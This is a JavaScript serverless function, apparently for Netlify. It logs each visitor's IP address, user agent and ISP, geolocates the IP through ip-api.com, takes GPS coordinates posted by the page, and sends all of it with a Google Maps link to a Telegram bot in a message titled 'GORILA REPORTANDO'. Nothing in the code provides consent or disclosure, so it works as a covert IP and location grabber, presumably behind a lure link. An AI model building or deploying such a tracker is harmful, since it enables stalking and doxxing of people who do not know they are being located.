const axios = require('axios');

exports.handler = async (event) => {
    // Definir IPs y datos básicos
    const clientIP = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'] || "127.0.0.1";
    const userAgent = event.headers['user-agent'] || "Desconocido";

    try {
        // Parsear el body con seguridad
        let bodyData = {};
        if (event.body) {
            try { bodyData = JSON.parse(event.body); } catch (e) { bodyData = {}; }
        }

        // Consultar IP-API (con timeout para que no se cuelgue Netlify)
        let ipData = {};
        try {
            const res = await axios.get(`http://ip-api.com/json/${clientIP}`, { timeout: 2000 });
            ipData = res.data;
        } catch (e) { ipData = {}; }

        // Configurar coordenadas (GPS o IP)
        const lat = bodyData.lat || ipData.lat || 0;
        const lon = bodyData.lon || ipData.lon || 0;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        // Construir mensaje
        let mensaje = `🦍 *¡GORILA REPORTANDO!* 🦍\n\n`;
        mensaje += `🔑 *IP:* \`${clientIP}\`\n`;
        mensaje += `📍 *Ubicación:* ${bodyData.lat ? '🎯 GPS' : '☁️ IP'}\n`;
        mensaje += `📡 *ISP:* ${ipData.isp || 'Desconocido'}\n`;
        mensaje += `📱 *Dispositivo:* ${userAgent.substring(0, 50)}...\n\n`;
        mensaje += `🗺️ [VER EN GOOGLE MAPS](${mapsUrl})`;

        // Enviar a Telegram
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'Markdown'
        });

        return { 
            statusCode: 200, 
            headers: { "Access-Control-Allow-Origin": "*" },
            body: "Reporte enviado" 
        };

    } catch (error) {
        console.error("Error crítico:", error.message);
        return { 
            statusCode: 500, 
            body: "Error interno: " + error.message 
        };
    }
};